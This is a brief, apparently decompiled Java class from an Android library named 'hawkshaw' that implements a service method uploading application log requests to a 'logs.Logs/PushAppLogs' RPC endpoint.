package com.hawkshaw.library.datalayer.network.service;

import X1.B;
import a3.e;
import com.hawkshaw.library.datalayer.models.AppLogsRequest;
import t3.N;

public final class LogsServiceImpl implements LogsService {
    public Object pushAppLogs(AppLogsRequest appLogsRequest, e eVar) {
        return B.B(N.f9292c, new LogsServiceImpl$pushAppLogs$$inlined$apiCall$default$1("logs.Logs/PushAppLogs", appLogsRequest, false, (e) null), eVar);
    }
}
